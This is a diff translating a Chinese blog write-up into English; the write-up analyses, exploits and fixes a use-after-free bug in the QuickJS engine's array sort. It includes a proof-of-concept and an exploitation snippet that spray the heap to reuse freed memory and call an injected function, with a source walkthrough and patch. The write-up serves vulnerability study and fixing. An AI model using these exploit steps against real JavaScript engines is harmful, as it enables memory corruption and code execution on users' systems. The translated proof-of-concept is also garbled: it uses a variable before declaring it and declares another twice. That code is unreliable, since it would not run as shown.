@@ -1,49 +1,51 @@
 ---
-title: "Quickjs UAF漏洞分析，利用以及修复"
-date: 2019-08-01T21:47:00+11:00
-summary: Quickjs是一个轻量的js引擎，先放张benchmark。可以看到作为一个轻量的js引擎，Quickjs是十分优秀的。在评分上甚至和Hermes这种重型js引擎并驾齐驱。虽然和v8相比还是有不小差距，但是毕竟是一个人开发的，而且相比v8，Quickjs才620kb。
+Title: "Analysis, Exploitation and Fix of Quickjs UAF Vulnerability"
+Date: 2019-08-01T21:47:00+11:00
+Summary: Quickjs is a lightweight JavaScript engine. Let's start with a benchmark. As a lightweight JavaScript engine, Quickjs is excellent, even comparable to heavy engines like Hermes in terms of performance. Although there is still a considerable gap compared to V8 javascript engine, Quickjs was developed by only one person and is only 620kb in size compared to V8.
 draft: false
 ---
 
-## 0x01 介绍
+## 0x01 Introduction
 
-[Quickjs](https://bellard.org/quickjs/)是一个轻量的js引擎，先放张benchmark。可以看到作为一个轻量的js引擎，Quickjs是十分优秀的。在评分上甚至和Hermes这种重型js引擎并驾齐驱。虽然和v8相比还是有不小差距，但是毕竟是一个人开发的，而且相比v8，Quickjs才620kb。
+[Quickjs](https://bellard.org/quickjs/) is a lightweight JavaScript engine. Let's start with a benchmark to see how excellent Quickjs is as a lightweight JavaScript engine. Its score is even on par with heavyweight JavaScript engines like Hermes. Although there is still a significant gap when compared with V8, it is still impressive that Quickjs is only 620kb and developed by one person.
 
 ![](https://i.imgur.com/xBWtj3e.png) 
 
-具体特性这里就不讲了，有兴趣的可以去Quickjs的作者网站 https://bellard.org/quickjs/， 了解Quickjs的更多特性的同时， 也顺便膜拜一下大神。
+We won't go into the specific features of Quickjs here, but if you're interested, you can visit the author's website at https://bellard.org/quickjs/ to learn more about Quickjs's features.
 
-之所以写这篇文章还是因为偶像的一个微博。
+The reason for writing this article is because of a post I saw.
 
 ![](https://i.imgur.com/1MBnEvT.png)
 
-接下来通过对POC和Quickjs的源码进行分析，看看这个漏洞到底是如何产生的，以及如何利用和修复。
+Next, we will analyze the POC and Quickjs's source code to see how this vulnerability occurs, how it can be exploited, and how to fix it.
 
 ## 0x02 POC
 
 ```js=
 let spray = new Array(100);
-let a = [{hack:0},1,2,3,4]; // 在heap上分配内存给{hack:0}, a[0]指向相对应的对象在堆中的地址
-let refcopy = [a[0]]; // refcopy指向{hack:0}
-// 抛出异常
+// Allocate memory on the heap for {hack:0}, with a[0] pointing to the corresponding object's address in the heap
+let refcopy = [a[0]]; // refcopy points to {hack:0}
+let a = [{hack:0},1,2,3,4]; 
+let refcopy = [a[0]]; // refcopy points to {hack:0}
+// Throw an exception
 a.__defineSetter__(3,()=>{throw 1;}); 
 // 下面的排序会触发异常抛出，具体如何触发下文会有介绍
 try {
 	a.sort(function(v){if (v == a[0]) return 0; return 1;}); 
 }
 catch (e){}
-a[0] = 0; // 对象{hack：0}的引用减少1,小于等于0,导致内存被收回
-for (let i=0; i<100; i++) spray[i] = [13371337]; // 覆盖被释放的内存
+// Reduce the reference count of object {hack:0} by 1, causing the memory to be reclaimed if it's less than or equal to 0
+a[0] = 0; 
+for (let i=0; i<100; i++) spray[i] = [13371337]; // Overwrite the freed memory
 console.log(refcopy[0]); // 13371337
 ```
-通过代码可以看出，这是一个典型的uaf（use after free）攻击。 通过array sorting的漏洞，导致引用没有正确释放，从而使攻击者可以使用这个引用访问已经被释放的内存。接下来通过对Quickjs的源码分析，看看到底是什么原因导致这个漏洞。
+From the code, we can see that this is a typical use-after-free (UAF) attack. The vulnerability occurs due to a flaw in the array sorting mechanism, which results in a reference not being properly released. As a result, an attacker can use this reference to access memory that has already been freed. Next, by analyzing the source code of Quickjs, we can see what caused this vulnerability.
 
-## 0x03 源码分析
+## 0x03 Source Code Analysis
 
-在Quickjs的源码里，我认为有三个函数对于理解这个漏洞是非常重要的，他们分别是js_array_sort， JS_TryGetPropertyInt64， JS_FreeValue。其中后面两个函数将会被js_array_sort调用。 下面将对这三个函数进行具体分析。
+In the Quickjs source code, I think there are three functions that are very important for understanding this vulnerability, which are js_array_sort, JS_TryGetPropertyInt64, and JS_FreeValue. The latter two functions will be called by js_array_sort. Below is a detailed analysis of these three functions.
 
-
-首先是最重要的js_array_sort，漏洞就是出现在这个函数里面。
+First is the most important function, js_array_sort, where the vulnerability exists.
 ```c=
 static JSValue js_array_sort(JSContext *ctx, JSValueConst this_val,
                              int argc, JSValueConst *argv)
@@ -56,7 +58,7 @@ static JSValue js_array_sort(JSContext *ctx, JSValueConst this_val,
             size_t new_size, slack;
             ValueSlot *new_array;
             new_size = (array_size + (array_size >> 1) + 31) & ~15;
-            // 分配新的内存空间给一个临时队列，用于排序
+            // Allocate new memory space for a temporary queue for sorting
             new_array = js_realloc2(ctx, array, new_size * sizeof(*array),
             &slack);
             if (new_array == NULL)
@@ -65,8 +67,8 @@ static JSValue js_array_sort(JSContext *ctx, JSValueConst this_val,
             array = new_array;
             array_size = new_size;
         }
-        // 尝试获取对象的属性，并赋值给新生成的array
-        // 此函数会增加{hack:0}的引用计数， 下文有专门介绍
+        // Try to get the property of the object and assign it to the newly generated array
+        // This function will increase the reference count of {hack:0}, which is explained below
         present = JS_TryGetPropertyInt64(ctx, obj, i, &array[pos].val);
    
         if (present < 0)
@@ -82,7 +84,8 @@ static JSValue js_array_sort(JSContext *ctx, JSValueConst this_val,
         pos++;
     }
 
-    // 对array进行排序，当队列的元素少于等于特定值（6个）使用插入排序
+    // Sort the array, using insertion sort when the number of elements 
+    // in the queue is less than or equal to a specific value (6)
     rqsort(array, pos, sizeof(*array), js_array_cmp_generic, &asc);
 
     if (asc.exception)
@@ -93,11 +96,11 @@ static JSValue js_array_sort(JSContext *ctx, JSValueConst this_val,
         if (array[n].str)
             JS_FreeValue(ctx, JS_MKPTR(JS_TAG_STRING, array[n].str));
         if (array[n].pos == n) {
-            // 如果顺序没有发生改变，释放array里面对应的元素
+            // If the order has not changed, free the corresponding element in array
             JS_FreeValue(ctx, array[n].val);
         } else {
-            // 如果顺序发生改变，将array里的值写回对象对应的属性，这里触发异常抛出
-            // 直接进入异常处理部分
+            // If the order has changed, write the value in array back to the corresponding property of the object, 
+            // which will trigger an exception and go directly to the exception handling part
             // a.__defineSetter__(3,()=>{throw 1;});
             if (JS_SetPropertyInt64(ctx, obj, n, array[n].val) < 0) { 
                 n++;
@@ -120,9 +123,8 @@ static JSValue js_array_sort(JSContext *ctx, JSValueConst this_val,
 
 exception:
     for (n = 0; n < pos; n++) {
-        // 释放array里面对应的元素内存，导致对象reference减少1
-        // 这里出现重复释放（在进入异常处理前，一部分array中的元素已经释放）
-        // 下文有专门介绍
+        // Free the memory of the corresponding element in array, causing the reference of the object to decrease by 1
+        // duplicate release here
         JS_FreeValue(ctx, array[n].val); 
         if (array[n].str)
             JS_FreeValue(ctx, JS_MKPTR(JS_TAG_STRING, array[n].str));
@@ -136,7 +138,7 @@ fail:
 
 ```
 
-接下来是JS_TryGetPropertyInt64， 这个函数会增加{hack:0}对象的引用计数。
+The following is JS_TryGetPropertyInt64. This function will increase the reference count of the {hack:0} object.
 ```c=
 static int JS_TryGetPropertyInt64(JSContext *ctx, JSValueConst obj, int64_t idx, JSValue *pval)
 {
@@ -149,10 +151,10 @@ static int JS_TryGetPropertyInt64(JSContext *ctx, JSValueConst obj, int64_t idx,
     // #define likely(x)  __builtin_expect(!!(x), 1) 分支预测
     if (likely((uint64_t)idx <= JS_ATOM_MAX_INT)) {
         /* fast path */
-        // 全部都进入这个分支
+        // All go into this branch
         present = JS_HasProperty(ctx, obj, __JS_AtomFromUInt32(idx));
         if (present > 0) {
-            // JS_NewInt32里面调用JS_DupValue，将会增加对象{hack:0}的引用计数
+            // JS_NewInt32 calls JS_DupValue, which will increase the reference count of the {hack:0} object
             val = JS_GetPropertyValue(ctx, obj, JS_NewInt32(ctx, idx));
             // #define unlikely(x)  __builtin_expect(!!(x), 0)
             if (unlikely(JS_IsException(val)))
@@ -177,14 +179,14 @@ static int JS_TryGetPropertyInt64(JSContext *ctx, JSValueConst obj, int64_t idx,
 }
 ```
 
-最后是JS_FreeValue。 顾名思义是一个减少引用计数，释放内存的函数。
+Finally, there is JS_FreeValue(), which is a function that reduces the reference count and releases memory.
 ```c=
 static inline void JS_FreeValue(JSContext *ctx, JSValue v)
 {
     if (JS_VALUE_HAS_REF_COUNT(v)) {
         JSRefCountHeader *p = JS_VALUE_GET_PTR(v); 
-        // Quickjs使用引用计数的方式做垃圾回收
-        // 当引用减少到小于等于0时，释放相应内存
+        // The Quickjs garbage collector uses reference counting to release
+        // memory when the reference count is decreased to zero or less.
         if (--p->ref_count <= 0) { 
             __JS_FreeValue(ctx, v);
         }
@@ -192,24 +194,24 @@ static inline void JS_FreeValue(JSContext *ctx, JSValue v)
 }
 ```
 
-## 0x04 原理和触发条件
+## 0x04 Principles and Triggering Conditions
 
-Quickjs在进行sorting的时候主要有三个阶段。
+Quickjs has three main stages when performing sorting:
 
-- 第一阶段是生成一个新的array，将要排序的array object(a = [{hack:0},1,2,3,4])通过getproperty的方式(主要函数是JS_TryGetPropertyInt64)，把value写入array。
-- 第二个阶段是对这个array进行排序（rqsort）。
-- 第三个阶段是将这个array里面的值通过setproporty的方法重新写回object。而出现错误的地方就是在第三个阶段。 当排序的过后，如果array里面的元素顺序没有发生变化，相应的元素内存会被马上释放（准确来说是减少引用次数）。但是如果之后回写剩余元素的时候出现异常，会进入异常处理的部分。这里整个array里的所有元素又会被重新释放一次，而这里面就包括了之前因为顺序没有变化而已经释放的元素，导致引用计数被多减少一次。
+- The first stage is to generate a new array. The array object to be sorted (a = [{hack:0},1,2,3,4]) is written into the array as values using the JS_TryGetPropertyInt64 function via getproperty.
+- The second stage is to sort the array (rqsort).
+- The third stage is to rewrite the values in this array back to the object using setproperty. The problematic area occurs in the third stage. After the sorting is done, if the order of the elements in the array has not changed, the corresponding element memory will be immediately released (to be exact, the reference count will be reduced). However, if an exception occurs when rewriting the remaining elements, it will enter the exception handling part. All the elements in the entire array will be released again, including the ones that have already been released due to the order not changing, causing the reference count to be reduced by one more time.
 
-搞清楚原理之后，我们就知道要触发这个漏洞的条件是
+After understanding the principle, we know that the triggering conditions for this vulnerability are:
 
-1. 对有对象引用的队列进行排序
-2. 排序时抛出异常
-3. 对队列中的对象进行引用，这样内存错误释放后，仍然可以访问相应内存
+1. Sorting queues with object references.
+2. Throwing exceptions during sorting.
+3. Referencing objects in the queue so that after the memory error is released, the corresponding memory can still be accessed.
 
-## 0x05 利用
-一般对这种uaf的利用都是用函数地址去覆盖被错误释放的内存，从而实现执行任意代码。这里面涉及到了堆栈的内存分配和释放，有兴趣的可以看看[Modern Binary Exploitation CSCI 4968](http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/17/10_lecture.pdf)，里面有详细的关于堆栈漏洞的利用原理的介绍。
+## 0x05 Exploitation
+Usually, for this type of UAF exploitation, function addresses are used to overwrite the mistakenly released memory to achieve arbitrary code execution. This involves heap and stack memory allocation and release. Those who are interested can take a look at the detailed introduction to the exploitation principles of heap and stack vulnerabilities in [Modern Binary Exploitation CSCI 4968](http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/17/10_lecture.pdf).
 
-利用代码如下
+The exploitation code is as follows.
 
 ```js=
 let spray = new Array(100);
@@ -223,34 +225,29 @@ try {
 catch (e){}
 a[0] = 0; 
 
-// 用函数地址覆盖错误释放的内存
+// Overwrite the memory incorrectly released with the address of a function.
 for (let i=0; i<100; i++) spray[i] = () => {console.log("hack")}; 
 console.log(refcopy[0]()); // "hack"
 ```
 
-## 0x06 修复
+## 0x06 Fix
 
-之前原理部分已经提到，出错的原因在于排序出错的时候，array的所有元素都会被引用计数减1，造成重复释放。所以只要去掉重复释放的地方就可以。一种修改方法是当顺序不变的时候先不释放，等全部元素都写回object之后在把array中所有元素集中一起释放。还有一种修改方法是在出错的时候不要重复释放之前已经释放的元素，具体修改如下：
+As mentioned in the previous section on the principle, the reason for the error was that when the sorting was wrong, all elements of the array would have their reference count reduced by 1, causing duplicate releases. So, to fix this issue, the redundant release points need to be removed. One modification method is to refrain from releasing the elements until all of them have been written back to the object, when the order remains unchanged. Another modification method is to avoid releasing the elements that have already been released before the error occurred. The specific modification is as follows:
 
 ```c=
 ...
 exception:
-    // for (n = 0; n < pos; n++) { // 释放整个array的所有元素
-    for (; n < pos; n++) { // 从出错的地方之后开始释放
-        // 释放array里面对应的元素内存，导致对象reference减少1
+    // for (n = 0; n < pos; n++) { // Release all elements of the array
+    for (; n < pos; n++) { // Release elements starting from the point of error
+         // Release the memory of the corresponding element in the array, leading to a decrease of the object reference count
         JS_FreeValue(ctx, array[n].val); 
         if (array[n].str)
             JS_FreeValue(ctx, JS_MKPTR(JS_TAG_STRING, array[n].str));
     }
 ```
 
-在7月21号的新release中，这个uaf的漏洞已经被修复。通过diff我们可以发现作者选择了第二种更简单高效的修复方式。
+In the new release on July 21st, the uaf vulnerability has been fixed. By examining the diff, we can see that the author chose the second, simpler and more efficient method of fixing the issue.
 
-## 0x07 道高一尺，魔高一丈
-
-![](https://i.imgur.com/JI8wvC1.png)
-
-在新Release发出来没几天，又有人发现新的uaf漏洞。推特发出没多久，漏洞发现者就说，这个漏洞已经被Quickjs的作者修复了。不愧是大神。期待Quickjs的下一个release！
 
 ## Reference
 
